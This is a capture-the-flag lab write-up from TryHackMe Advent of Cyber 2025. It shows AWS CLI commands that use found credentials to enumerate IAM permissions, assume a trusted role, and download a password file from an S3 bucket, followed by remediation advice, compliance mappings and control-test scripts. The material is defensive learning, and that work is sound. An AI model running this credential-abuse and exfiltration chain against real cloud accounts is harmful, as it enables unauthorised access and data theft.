# AWS Security Analysis - S3cret Santa

**Lab:** TryHackMe Advent of Cyber 2025 Day 23  
**Completed:** December 23, 2025 | Documented: January 9, 2026  
**Focus:** AWS IAM privilege enumeration, role assumption, and S3 security analysis

-----

## Executive Summary

Performed hands-on AWS security analysis simulating an attacker scenario where compromised credentials were used to enumerate IAM permissions, assume privileged roles, and access sensitive data in S3 buckets. This exercise demonstrates practical understanding of AWS security concepts, IAM policy analysis, and cloud access control principles—directly applicable to GRC automation and cloud infrastructure control validation.

**Key Achievement:** Successfully chained multiple low-privilege permissions to achieve high-impact access, demonstrating how seemingly limited IAM permissions can create privilege escalation paths when combined with role assumption capabilities.

-----

## Scenario

**The Setup:** An infiltrated agent discovered cloud credentials belonging to “Sir Carrotbane” (a user in The Best Festival Company’s AWS environment) and suspected they could provide access to TBFC’s cloud network. The mission: enumerate privileges, identify access paths, and determine what sensitive data could be accessed.

**The Challenge:** Starting with limited credentials, identify what permissions are available, discover privilege escalation paths through role assumption, and ultimately access restricted resources—all while documenting the control gaps that enabled this access.

**Real-World Parallel:** This scenario mirrors actual cloud security incidents where attackers discover credentials (phishing, exposed .env files, leaked repos) and systematically escalate privileges to access sensitive data. Understanding this attack chain is critical for GRC roles focused on cloud security controls.

-----

## Key Learning Objectives

✅ **AWS Account Fundamentals** - Understanding AWS credential types and authentication mechanisms  
✅ **IAM Privilege Enumeration** - Analyzing permissions from an attacker’s perspective  
✅ **AWS CLI Automation** - Programmatic interaction with AWS services for security analysis  
✅ **Role Assumption Mechanics** - Temporary credential handling via AWS STS  
✅ **S3 Security Analysis** - Bucket enumeration, access control validation, data exfiltration  
✅ **Control Gap Documentation** - Identifying misconfigurations and recommending remediation

-----

## Technical Environment

**Tools & Services Used:**

- **AWS CLI** - Command-line interface for AWS service interaction and automation
- **AWS STS (Security Token Service)** - Temporary credential generation and role assumption
- **AWS IAM (Identity and Access Management)** - User, role, and policy management
- **AWS S3 (Simple Storage Service)** - Object storage and bucket management

**Lab Environment:**

- TryHackMe browser-based virtual machine
- Pre-configured AWS credentials at `~/.aws/credentials`
- Simulated AWS account with intentional misconfigurations

-----

## Attack Path Summary

This diagram shows the complete privilege escalation chain from initial credential compromise to sensitive data exfiltration:

```
┌─────────────────────────────────────────────────────────────┐
│ PHASE 1: INITIAL ACCESS                                     │
└─────────────────────────────────────────────────────────────┘
    ↓
1. Initial Access: AWS access key + secret key (discovered)
    ↓
2. Identity Confirmation: aws sts get-caller-identity
    → Result: Confirmed credentials belong to "sir.carrotbane" user
    ↓
┌─────────────────────────────────────────────────────────────┐
│ PHASE 2: PERMISSION ENUMERATION                             │
└─────────────────────────────────────────────────────────────┘
    ↓
3. Permission Enumeration: IAM policy analysis
    → Result: Can list IAM entities + CRITICAL: sts:AssumeRole permission
    ↓
┌─────────────────────────────────────────────────────────────┐
│ PHASE 3: PRIVILEGE ESCALATION                               │
└─────────────────────────────────────────────────────────────┘
    ↓
4. Role Discovery: aws iam list-roles
    → Result: Found "bucketmaster" role (sir.carrotbane is in trust policy)
    ↓
5. Role Policy Analysis: aws iam get-role-policy
    → Result: Role has ListBuckets + GetObject permissions on S3 buckets
    ↓
6. Role Assumption: aws sts assume-role
    → Result: Obtained temporary credentials for bucketmaster role
    ↓
┌─────────────────────────────────────────────────────────────┐
│ PHASE 4: DATA EXFILTRATION                                  │
└─────────────────────────────────────────────────────────────┘
    ↓
7. S3 Enumeration: aws s3api list-buckets
    → Result: Found "easter-secrets-123145" bucket (suspicious name)
    ↓
8. Data Exfiltration: aws s3api get-object
    → Result: Successfully downloaded "cloud_password.txt" (sensitive data)
```

**Key Insight:** This attack chain demonstrates how multiple low-privilege permissions can be chained together for high-impact access. Sir.carrotbane appeared to have minimal permissions (just IAM enumeration), but the `sts:AssumeRole` capability created an indirect privilege escalation path to sensitive S3 data. This is a common real-world misconfiguration.

-----

## Detailed Technical Analysis

### Phase 1: Initial Reconnaissance

**Objective:** Confirm credential validity and identify the account context.

**Command Executed:**

```bash
aws sts get-caller-identity
```

**Output:**

```json
{
    "UserId": "AIDAU2VYTBGYOHNOCJMX3",
    "Account": "332173347248",
    "Arn": "arn:aws:iam::332173347248:user/sir.carrotbane"
}
```

**Analysis:**

- Credentials are valid and active
- Belong to IAM user: `sir.carrotbane`
- AWS Account ID: `332173347248`
- User ARN (Amazon Resource Name) confirms standard IAM user (not federated/assumed role)

**Security Implication:** Valid credentials confirm initial access. Next step: determine what this user is authorized to do within the AWS environment.

**GRC Relevance:** Initial access validation is the first step in any security assessment. In automated control testing, this would trigger logging/alerting if performed from unauthorized IP or location.

-----

### Phase 2: IAM Permission Enumeration

**Objective:** Systematically identify what permissions sir.carrotbane has been granted.

#### Step 2.1: List User’s Inline Policies

**Command:**

```bash
aws iam list-user-policies --user-name sir.carrotbane
```

**Finding:** One inline policy attached directly to sir.carrotbane user.

#### Step 2.2: List User’s Attached (Managed) Policies

**Command:**

```bash
aws iam list-attached-user-policies --user-name sir.carrotbane
```

**Finding:** No managed policies attached.

#### Step 2.3: Check Group Membership

**Command:**

```bash
aws iam list-groups-for-user --user-name sir.carrotbane
```

**Finding:** User is not a member of any IAM groups.

#### Step 2.4: Retrieve Inline Policy Details

**Command:**

```bash
aws iam get-user-policy --policy-name [POLICY_NAME] --user-name sir.carrotbane
```

**Policy Document Retrieved:**

```json
{
    "UserName": "sir.carrotbane",
    "PolicyName": "ListIAMEntities",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:ListUsers",
                    "iam:ListGroups",
                    "iam:ListRoles",
                    "iam:ListAttachedUserPolicies",
                    "iam:ListAttachedGroupPolicies",
                    "iam:ListAttachedRolePolicies",
                    "iam:GetUserPolicy",
                    "iam:GetGroupPolicy",
                    "iam:GetRolePolicy",
                    "iam:GetUser",
                    "iam:GetGroup",
                    "iam:GetRole",
                    "iam:ListGroupsForUser",
                    "iam:ListUserPolicies",
                    "iam:ListGroupPolicies",
                    "iam:ListRolePolicies",
                    "sts:AssumeRole"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ListIAMEntities"
            }
        ]
    }
}
```

**Critical Findings:**

1. **IAM Enumeration Permissions:**
- Can list and get details for all IAM users, groups, and roles
- Can list and retrieve all policy documents
- This is reconnaissance capability—allows mapping entire IAM landscape
1. **🚨 CRITICAL: sts:AssumeRole Permission:**
- Can attempt to assume any role where sir.carrotbane is listed in trust policy
- This is the privilege escalation vector
- Allows “borrowing” permissions from more privileged roles

**Security Implication:**

While sir.carrotbane cannot directly access resources (no S3, EC2, or other service permissions), the `sts:AssumeRole` permission creates an **indirect privilege escalation path**. This is a common misconfiguration where administrators grant “read-only” IAM access for troubleshooting without realizing AssumeRole can be weaponized.

**Real-World Parallel:**

This mirrors the 2019 Capital One breach where an attacker exploited overly permissive IAM roles. The initial access had limited permissions, but role assumption led to accessing 100 million customer records. The “sts:AssumeRole” permission is deceptively powerful.

**GRC Control Mapping:**

- **SOC 2 CC6.1:** Fails least-privilege principle (AssumeRole grants excessive indirect access)
- **ISO 27001 A.9.2.3:** Fails segregation of duties (enumeration + assumption = reconnaissance + exploitation)
- **NIST 800-53 AC-6:** Violates least privilege by allowing unrestricted role assumption

-----

### Phase 3: Role Discovery & Analysis

**Objective:** Identify roles that sir.carrotbane can assume and analyze their permissions.

#### Step 3.1: Enumerate All Roles

**Command:**

```bash
aws iam list-roles
```

**Key Role Discovered:**

```json
{
    "Path": "/",
    "RoleName": "bucketmaster",
    "RoleId": "AROARZPUZDIKJJZ6OWN27",
    "Arn": "arn:aws:iam::332173347248:role/bucketmaster",
    "CreateDate": "2024-11-26T01:54:01+00:00",
    "AssumeRolePolicyDocument": {
        "Statement": [
            {
                "Action": "sts:AssumeRole",
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::332173347248:user/sir.carrotbane"
                }
            }
        ],
        "Version": "2012-10-17"
    },
    "MaxSessionDuration": 3600
}
```

**Analysis of Trust Policy:**

The `AssumeRolePolicyDocument` (also called a “trust policy”) defines **who** can assume this role:

- **Principal:** `arn:aws:iam::332173347248:user/sir.carrotbane`
- **Translation:** Sir.carrotbane is explicitly allowed to assume bucketmaster role
- **MaxSessionDuration:** 3600 seconds (1 hour) - temporary credentials valid for 1 hour

**Security Implication:** This role was intentionally configured to trust sir.carrotbane. This may be:

- Legacy access that was never revoked
- Overly permissive trust policy (should use conditions: MFA, IP restrictions)
- Compromised design (mixing low-privilege user with high-privilege role access)

#### Step 3.2: Analyze Role’s Inline Policies

**Command:**

```bash
aws iam list-role-policies --role-name bucketmaster
```

**Finding:** One inline policy named `BucketMasterPolicy`

#### Step 3.3: Check Role’s Attached Policies

**Command:**

```bash
aws iam list-attached-role-policies --role-name bucketmaster
```

**Finding:** No managed policies attached.

#### Step 3.4: Retrieve Role Policy Details

**Command:**

```bash
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

**Policy Document:**

```json
{
    "RoleName": "bucketmaster",
    "PolicyName": "BucketMasterPolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": ["s3:ListAllMyBuckets"],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ListAllBuckets"
            },
            {
                "Action": ["s3:ListBucket"],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::easter-secrets-123145",
                    "arn:aws:s3:::bunny-website-645341"
                ],
                "Sid": "ListBuckets"
            },
            {
                "Action": ["s3:GetObject"],
                "Effect": "Allow",
                "Resource": "arn:aws:s3:::easter-secrets-123145/*",
                "Sid": "GetObjectsFromEasterSecrets"
            }
        ]
    }
}
```

**Permissions Breakdown:**

1. **s3:ListAllMyBuckets (Resource: *)**
- Can list all S3 buckets in the account
- Broad reconnaissance capability
1. **s3:ListBucket (Resource: specific buckets)**
- Can list contents of `easter-secrets-123145` bucket
- Can list contents of `bunny-website-645341` bucket
- Targeted access to specific buckets
1. **s3:GetObject (Resource: easter-secrets-123145/*)**
- Can download ANY object from `easter-secrets-123145` bucket
- Wildcard (*) means all objects in bucket
- This is the data exfiltration vector

**Security Implication:**

The bucketmaster role has **direct access to sensitive S3 buckets**. By assuming this role, sir.carrotbane can:

- Discover all S3 buckets in the account
- List contents of specific sensitive buckets
- Download sensitive files

**Naming Analysis:**

- Bucket name: `easter-secrets-123145` - The word “secrets” in a bucket name is a red flag
- This suggests sensitive data storage (credentials, API keys, confidential documents)

**Real-World Impact:**

This represents a **complete privilege escalation**:

- Started with: IAM read-only + AssumeRole
- Escalated to: Full read access to sensitive S3 buckets
- Result: Potential data breach

**GRC Control Failures:**

1. **Excessive S3 Permissions:** GetObject with wildcard violates least privilege
1. **No Conditional Access:** Role can be assumed from anywhere (no IP/MFA requirements)
1. **No Bucket Policies:** S3 buckets lack additional defense-in-depth controls
1. **Poor Naming Convention:** “secrets” in bucket name aids attacker reconnaissance

-----

### Phase 4: Role Assumption (Privilege Escalation)

**Objective:** Obtain temporary credentials for the bucketmaster role to gain S3 access.

**Command:**

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::332173347248:role/bucketmaster \
  --role-session-name TBFC
```

**Parameter Explanation:**

- `--role-arn`: Amazon Resource Name of the role to assume
- `--role-session-name`: Arbitrary name for this session (appears in CloudTrail logs)

**Response:**

```json
{
    "Credentials": {
        "AccessKeyId": "REDACTED",
        "SecretAccessKey": "REDACTED",
        "SessionToken": "REDACTED",
        "Expiration": "2024-11-26T03:40:11+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARZPUZDIKJJZ6OWN27:TBFC",
        "Arn": "arn:aws:sts::332173347248:assumed-role/bucketmaster/TBFC"
    },
    "PackedPolicySize": 6
}
```

**Credential Components:**

1. **AccessKeyId:** Temporary access key (starts with ASIA for temporary creds)
1. **SecretAccessKey:** Temporary secret key
1. **SessionToken:** Required for temporary credentials (this is what makes them temporary)
1. **Expiration:** Timestamp when credentials expire (1 hour from issuance)

**Implementation:**

Configure AWS CLI to use temporary credentials:

```bash
export AWS_ACCESS_KEY_ID="REDACTED"
export AWS_SECRET_ACCESS_KEY="REDACTED"
export AWS_SESSION_TOKEN="REDACTED"
```

**Verification:**

Confirm identity change:

```bash
aws sts get-caller-identity
```

**New Output:**

```json
{
    "UserId": "AROARZPUZDIKJJZ6OWN27:TBFC",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/bucketmaster/TBFC"
}
```

**Analysis:**

- ARN changed from `iam::user/sir.carrotbane` to `sts::assumed-role/bucketmaster/TBFC`
- Now operating with bucketmaster role permissions
- Session name “TBFC” visible in ARN (would appear in CloudTrail logs for audit trail)

**Security Implication:**

**Privilege escalation complete.** We’ve successfully transitioned from a low-privilege user (IAM read-only) to a high-privilege role (S3 read access). This is the critical moment in the attack chain where reconnaissance becomes exploitation.

**Detection Opportunity:**

In a real environment, this AssumeRole action should trigger alerts:

- CloudTrail event: `sts:AssumeRole` by sir.carrotbane
- Unusual pattern: User assuming role outside normal business hours
- Geographic anomaly: Role assumption from unexpected location/IP

**GRC Automation Application:**

An automated control testing workflow could:

1. Daily scan for users with AssumeRole permissions
1. Map which roles they can assume
1. Calculate “effective permissions” (direct + assumed)
1. Flag violations where combined permissions exceed policy
1. Generate remediation tickets for security team

-----

### Phase 5: S3 Bucket Enumeration & Data Exfiltration

**Objective:** Leverage bucketmaster role permissions to access sensitive S3 data.

#### Step 5.1: List All S3 Buckets

**Command:**

```bash
aws s3api list-buckets
```

**Output:**

```json
{
    "Buckets": [
        {
            "Name": "bunny-website-645341",
            "CreationDate": "2024-11-25T10:30:00+00:00"
        },
        {
            "Name": "easter-secrets-123145",
            "CreationDate": "2024-11-20T14:22:00+00:00"
        }
    ],
    "Owner": {
        "DisplayName": "tbfc-admin",
        "ID": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
    }
}
```

**Analysis:**

- Two buckets discovered
- `bunny-website-645341` - Likely public-facing website assets (lower priority)
- `easter-secrets-123145` - Name suggests sensitive data (HIGH PRIORITY)

**Targeting Decision:** Focus on `easter-secrets-123145` based on naming convention.

#### Step 5.2: List Objects in Target Bucket

**Command:**

```bash
aws s3api list-objects --bucket easter-secrets-123145
```

**Output:**

```json
{
    "Contents": [
        {
            "Key": "cloud_password.txt",
            "LastModified": "2024-11-22T09:15:00+00:00",
            "ETag": "\"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\"",
            "Size": 42,
            "StorageClass": "STANDARD"
        }
    ]
}
```

**Analysis:**

- One object found: `cloud_password.txt`
- File size: 42 bytes (small text file)
- Storage class: STANDARD (not encrypted with SSE-S3 or SSE-KMS based on lack of ServerSideEncryption field)
- **CRITICAL:** Filename indicates this contains credentials

**Security Red Flags:**

1. Credentials stored in plaintext file
1. Obvious naming convention (`password` in filename)
1. No encryption at rest
1. No versioning enabled (can’t track access history)

#### Step 5.3: Download Sensitive File

**Command:**

```bash
aws s3api get-object \
  --bucket easter-secrets-123145 \
  --key cloud_password.txt \
  cloud_password.txt
```

**Output:**

```json
{
    "AcceptRanges": "bytes",
    "LastModified": "2024-11-22T09:15:00+00:00",
    "ContentLength": 42,
    "ETag": "\"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\"",
    "ContentType": "text/plain",
    "Metadata": {}
}
```

**File Contents:**

```
[SENSITIVE DATA REDACTED FOR DOCUMENTATION]
```

**Impact Assessment:**

✅ **Data Exfiltration Successful**

- Sensitive credential file downloaded to local machine
- File can now be used for further attacks
- Demonstrates complete breach: initial access → privilege escalation → data theft

**Real-World Consequences:**

If this were a real breach:

1. Attacker now has additional credentials (potential for lateral movement)
1. No encryption = data readable immediately
1. No CloudTrail alerts = breach may go undetected
1. No versioning = can’t determine if file was accessed previously

**Compliance Impact:**

This breach would trigger reporting requirements under:

- **GDPR:** If file contained EU citizen data (72-hour notification)
- **SOC 2:** Material control deficiency (must report to auditor)
- **PCI DSS:** If credentials related to cardholder data environment
- **PIPEDA:** Canadian privacy law breach notification

-----

## Control Gaps Identified

Based on the successful attack chain, the following control deficiencies were identified:

### 1. Overly Permissive AssumeRole Permission

**Issue:** Sir.carrotbane user can assume bucketmaster role without restrictions

**Specific Problem:**

- No MFA requirement for role assumption
- No source IP restrictions
- No time-based access controls
- Trust policy allows unconditional assumption

**Risk Level:** 🔴 **CRITICAL**

**Attack Vector:** Enables privilege escalation from low-privilege user to high-privilege role

**Recommendation:**

```json
{
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::332173347248:user/sir.carrotbane"
      },
      "Action": "sts:AssumeRole",
      "Condition": {
        "Bool": {"aws:MultiFactorAuthPresent": "true"},
        "IpAddress": {"aws:SourceIp": ["10.0.0.0/8"]},
        "DateGreaterThan": {"aws:CurrentTime": "2024-01-01T09:00:00Z"},
        "DateLessThan": {"aws:CurrentTime": "2024-01-01T17:00:00Z"}
      }
    }
  ]
}
```

**GRC Control Mapping:**

- SOC 2 CC6.1 (Logical Access Controls)
- ISO 27001 A.9.2.3 (Management of Privileged Access Rights)
- NIST 800-53 AC-6 (Least Privilege)

-----

### 2. Excessive S3 Permissions on Role

**Issue:** Bucketmaster role has wildcard GetObject permission on sensitive bucket

**Specific Problem:**

```json
{
  "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::easter-secrets-123145/*"
}
```

The `/*` grants access to ALL objects, not specific files.

**Risk Level:** 🔴 **CRITICAL**

**Attack Vector:** Any user who can assume bucketmaster can exfiltrate all bucket data

**Recommendation:**

**Option A - Least Privilege (Preferred):**

```json
{
  "Action": ["s3:GetObject"],
  "Resource": [
    "arn:aws:s3:::easter-secrets-123145/public/*",
    "arn:aws:s3:::easter-secrets-123145/approved-files/*"
  ]
}
```

**Option B - Remove Role Access:**

- Grant S3 permissions directly to specific users/services that need it
- Remove role entirely if it’s not serving a legitimate purpose

**GRC Control Mapping:**

- SOC 2 CC6.2 (System Access)
- ISO 27001 A.9.4.1 (Information Access Restriction)
- NIST 800-53 AC-3 (Access Enforcement)

-----

### 3. Lack of S3 Bucket Encryption

**Issue:** Objects in easter-secrets-123145 bucket are not encrypted at rest

**Specific Problem:**

- No default bucket encryption enabled
- Files stored in plaintext
- Credentials file (`cloud_password.txt`) readable immediately upon access

**Risk Level:** 🟠 **HIGH**

**Attack Vector:** If attacker gains S3 access, data is immediately readable (no decryption needed)

**Recommendation:**

**Enable Default Encryption:**

```bash
aws s3api put-bucket-encryption \
  --bucket easter-secrets-123145 \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "aws:kms",
        "KMSMasterKeyID": "arn:aws:kms:region:account:key/key-id"
      },
      "BucketKeyEnabled": true
    }]
  }'
```

**Additional Controls:**

- Require HTTPS for all bucket access (enforce encryption in transit)
- Enable versioning for audit trail
- Enable MFA Delete to prevent unauthorized deletion

**GRC Control Mapping:**

- SOC 2 CC6.7 (Encryption)
- ISO 27001 A.10.1.1 (Cryptographic Controls)
- NIST 800-53 SC-28 (Protection of Information at Rest)

-----

### 4. Missing CloudTrail Logging & Monitoring

**Issue:** No evidence of logging or alerting for sensitive actions

**Specific Problem:**

- AssumeRole action likely not monitored
- S3 GetObject access not generating alerts
- No detection of unusual access patterns

**Risk Level:** 🟠 **HIGH**

**Attack Vector:** Attacks can proceed undetected; incident response delayed

**Recommendation:**

**Enable CloudTrail:**

```bash
aws cloudtrail create-trail \
  --name security-audit-trail \
  --s3-bucket-name cloudtrail-logs-bucket
  
aws cloudtrail start-logging --name security-audit-trail
```

**Configure EventBridge Rules for Alerts:**

- Alert on: `sts:AssumeRole` for bucketmaster role
- Alert on: `s3:GetObject` from easter-secrets bucket
- Alert on: Multiple failed API calls (reconnaissance detection)

**GRC Control Mapping:**

- SOC 2 CC7.2 (System Monitoring)
- ISO 27001 A.12.4.1 (Event Logging)
- NIST 800-53 AU-2 (Audit Events)

-----

### 5. Inadequate S3 Bucket Policies

**Issue:** No bucket policy restricting access beyond IAM permissions

**Specific Problem:**

- Bucket relies solely on IAM permissions (single layer of defense)
- No IP restrictions
- No VPC endpoint requirements
- No deny conditions for unusual access

**Risk Level:** 🟡 **MEDIUM**

**Attack Vector:** Compromised credentials can access bucket from anywhere

**Recommendation:**

**Implement Defense-in-Depth Bucket Policy:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyUnencryptedObjectUploads",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::easter-secrets-123145/*",
      "Condition": {
        "StringNotEquals": {
          "s3:x-amz-server-side-encryption": "aws:kms"
        }
      }
    },
    {
      "Sid": "RequireSecureTransport",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::easter-secrets-123145",
        "arn:aws:s3:::easter-secrets-123145/*"
      ],
      "Condition": {
        "Bool": {"aws:SecureTransport": "false"}
      }
    },
    {
      "Sid": "RestrictBySourceIP",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::easter-secrets-123145/*",
      "Condition": {
        "NotIpAddress": {
          "aws:SourceIp": ["10.0.0.0/8", "192.168.0.0/16"]
        }
      }
    }
  ]
}
```

**GRC Control Mapping:**

- SOC 2 CC6.6 (Logical and Physical Access Controls)
- ISO 27001 A.13.1.3 (Segregation in Networks)
- NIST 800-53 AC-4 (Information Flow Enforcement)

-----

### 6. Poor Secret Management Practices

**Issue:** Credentials stored in plaintext file in S3 bucket

**Specific Problem:**

- File named `cloud_password.txt` (obvious target)
- No use of AWS Secrets Manager or Systems Manager Parameter Store
- Credentials not rotated
- No access controls on secret itself

**Risk Level:** 🔴 **CRITICAL**

**Attack Vector:** Once S3 access gained, credentials immediately compromised

**Recommendation:**

**Migrate to AWS Secrets Manager:**

```bash
aws secretsmanager create-secret \
  --name tbfc/cloud/password \
  --secret-string '{"username":"admin","password":"SecureP@ssw0rd"}' \
  --kms-key-id arn:aws:kms:region:account:key/key-id
```

**Enable Automatic Rotation:**

```bash
aws secretsmanager rotate-secret \
  --secret-id tbfc/cloud/password \
  --rotation-lambda-arn arn:aws:lambda:region:account:function:rotate-secret \
  --rotation-rules AutomaticallyAfterDays=30
```

**Access via IAM + Encryption:**

- Grant `secretsmanager:GetSecretValue` permission only to specific roles/users
- Encrypt with KMS (separate key access from secret access)
- Enable CloudTrail logging for all secret retrievals

**Delete File from S3:**

```bash
aws s3api delete-object --bucket easter-secrets-123145 --key cloud_password.txt
```

**GRC Control Mapping:**

- SOC 2 CC6.1 (Logical Access - Secrets Management)
- ISO 27001 A.9.4.3 (Password Management System)
- NIST 800-53 IA-5 (Authenticator Management)

-----

## GRC Automation Relevance

This lab demonstrates practical skills directly applicable to GRC automation and cloud security roles. Here’s how each phase maps to real-world GRC workflows:

### Control Testing Workflows

**Automated IAM Policy Review:**

The AWS CLI commands used in this lab can be scripted to create automated control tests:

```bash
#!/bin/bash
# Automated IAM Control Test: Detect Users with AssumeRole + Excessive Permissions

# 1. List all users
users=$(aws iam list-users --query 'Users[].UserName' --output text)

# 2. For each user, check for AssumeRole permission
for user in $users; do
  policies=$(aws iam list-user-policies --user-name $user --query 'PolicyNames' --output text)
  
  for policy in $policies; do
    assume_role=$(aws iam get-user-policy --user-name $user --policy-name $policy \
      --query 'PolicyDocument.Statement[?Action==`sts:AssumeRole`]' --output text)
    
    if [ ! -z "$assume_role" ]; then
      echo "FINDING: User $user has AssumeRole permission via policy $policy"
      
      # 3. Enumerate which roles they can assume
      roles=$(aws iam list-roles --query 'Roles[].RoleName' --output text)
      for role in $roles; do
        trust=$(aws iam get-role --role-name $role \
          --query 'Role.AssumeRolePolicyDocument.Statement[?Principal.AWS==`'"arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):user/$user"'`]' \
          --output text)
        
        if [ ! -z "$trust" ]; then
          echo "  -> Can assume role: $role"
          
          # 4. Check role's effective permissions
          role_policies=$(aws iam list-role-policies --role-name $role --query 'PolicyNames' --output text)
          echo "     Effective permissions: $role_policies"
        fi
      done
    fi
  done
done
```

**GRC Application:**

- Run daily as scheduled Lambda function
- Output generates audit evidence for “least privilege” control
- Failed checks create ServiceNow tickets for remediation
- Trends tracked over time for compliance reporting

-----

### Evidence Collection Automation

**S3 Encryption Compliance Check:**

```bash
#!/bin/bash
# Control Test: Verify all S3 buckets have encryption enabled

buckets=$(aws s3api list-buckets --query 'Buckets[].Name' --output text)

for bucket in $buckets; do
  encryption=$(aws s3api get-bucket-encryption --bucket $bucket 2>&1)
  
  if echo "$encryption" | grep -q "ServerSideEncryptionConfigurationNotFoundError"; then
    echo "FAIL: Bucket $bucket does not have default encryption enabled"
    echo "  Control: SOC 2 CC6.7, ISO 27001 A.10.1.1, NIST 800-53 SC-28"
    echo "  Risk: Data at rest not protected by encryption"
    echo "  Remediation: aws s3api put-bucket-encryption --bucket $bucket --server-side-encryption-configuration ..."
  else
    echo "PASS: Bucket $bucket has encryption enabled"
  fi
done
```

**Evidence Output:**

- Timestamped JSON results stored in compliance evidence bucket
- Screenshots/exports provided to auditors
- Pass/fail metrics dashboard in QuickSight
- Automated control effectiveness scoring

-----

### Compliance Framework Mapping

**Example: SOC 2 CC6.1 Control Testing**

**Control Requirement:** “The entity implements logical access security measures to protect against threats from sources outside its system boundaries.”

**Testing Approach (Automated):**

1. **Test 1:** Verify no users have unconditional AssumeRole permissions
- Query: Enumerate IAM users with `sts:AssumeRole` in policies
- Check: Confirm conditions exist (MFA, IP, time-based)
- Evidence: AWS CLI output showing policy conditions
1. **Test 2:** Verify roles have minimal necessary permissions
- Query: For each role, list attached permissions
- Check: No wildcard resource permissions (e.g., `"Resource": "*"`)
- Evidence: Policy analysis report flagging wildcards
1. **Test 3:** Verify CloudTrail logging enabled
- Query: `aws cloudtrail describe-trails`
- Check: All regions have active trails
- Evidence: CloudTrail configuration export

**Automation Workflow:**

```
Scheduled Job (daily) → Run AWS CLI tests → Parse results → 
Generate findings report → Update GRC dashboard → 
Create tickets for failures → Email summary to compliance team
```

-----

### Continuous Monitoring Architecture

**Event-Driven Control Validation:**

```
AWS CloudTrail (logs API calls)
    ↓
EventBridge Rule (filters for sensitive actions)
    ↓
Lambda Function (analyzes action against policy)
    ↓
    ├─ Pass → Log to S3 (evidence)
    └─ Fail → SNS Alert + ServiceNow ticket
              ↓
         Security team investigates
```

**Monitored Actions:**

- `sts:AssumeRole` - Flag unusual role assumptions
- `s3:PutBucketPolicy` - Alert on permission changes
- `iam:PutUserPolicy` - Detect privilege escalation attempts
- `s3:GetObject` on sensitive buckets - Data exfiltration detection

**GRC Value:**

- Real-time control monitoring vs. quarterly manual audits
- Audit evidence generated automatically
- Faster incident response (minutes vs. days)
- Continuous compliance posture vs. point-in-time

-----

### Policy-as-Code Integration

**IAM Policy Validation in CI/CD:**

```yaml
# Example: GitHub Actions workflow for IAM policy validation

name: IAM Policy Validation
on: [pull_request]

jobs:
  validate-policies:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Validate IAM Policies
        run: |
          # Check for wildcard resources
          if grep -r '"Resource": "\*"' iam-policies/; then
            echo "FAIL: Wildcard resources detected"
            exit 1
          fi
          
          # Check for missing conditions on AssumeRole
          if grep -r '"Action": "sts:AssumeRole"' iam-policies/ | grep -v '"Condition"'; then
            echo "FAIL: AssumeRole without conditions detected"
            exit 1
          fi
          
      - name: Run IAM Policy Simulator
        run: |
          aws iam simulate-custom-policy \
            --policy-input-list file://iam-policies/new-policy.json \
            --action-names s3:GetObject \
            --resource-arns arn:aws:s3:::sensitive-bucket/*
```

**GRC Application:**

- Prevent control failures before deployment
- Enforce policy standards automatically
- Generate compliance evidence (all policies reviewed)
- Reduce manual IAM review burden

-----

## Skills Demonstrated

### Technical Skills

✅ **AWS Fundamentals**

- Identity and Access Management (IAM users, roles, policies)
- Security Token Service (STS) for temporary credentials
- Simple Storage Service (S3) bucket and object operations
- AWS CLI command-line automation

✅ **Security Analysis**

- Credential validation and authentication testing
- Permission enumeration and policy analysis
- Privilege escalation path identification
- Access control gap analysis and risk assessment

✅ **Cloud Security Concepts**

- Role-based access control (RBAC) mechanisms
- Temporary credential lifecycle management
- Trust policies and permission boundaries
- Principle of least privilege application
- Defense-in-depth architecture

✅ **Automation & Scripting**

- AWS CLI command chaining and automation
- Bash scripting for security testing
- Environment variable management
- Programmatic credential handling
- Automated compliance checks

✅ **Attack Methodology**

- Reconnaissance techniques (IAM enumeration)
- Lateral movement (role assumption)
- Data exfiltration (S3 object retrieval)
- Attack chain documentation
- Defensive recommendations

-----

### GRC & Compliance Skills

✅ **Control Testing**

- Manual and automated control validation
- Evidence collection and documentation
- Control deficiency identification
- Remediation recommendation development

✅ **Framework Mapping**

- SOC 2 (CC6.1, CC6.2, CC6.7, CC7.2)
- ISO 27001 (A.9.2.3, A.9.4.1, A.10.1.1, A.12.4.1)
- NIST 800-53 (AC-3, AC-6, AU-2, IA-5, SC-28)

✅ **Risk Assessment**

- Risk level classification (Critical/High/Medium/Low)
- Impact analysis (confidentiality, compliance, operations)
- Likelihood assessment
- Risk mitigation strategy development

✅ **Audit & Documentation**

- Detailed finding documentation
- Root cause analysis
- Corrective action recommendations
- Audit trail creation

-----

### Soft Skills

✅ **Technical Communication**

- Translating technical findings for non-technical stakeholders
- Executive summary writing
- Detailed technical documentation
- Remediation guidance

✅ **Analytical Thinking**

- Pattern recognition (security misconfigurations)
- System architecture analysis
- Attack path mapping
- Defensive thinking

✅ **Problem Solving**

- Multi-step attack chain execution
- Troubleshooting AWS CLI commands
- Configuration analysis
- Solution development

-----

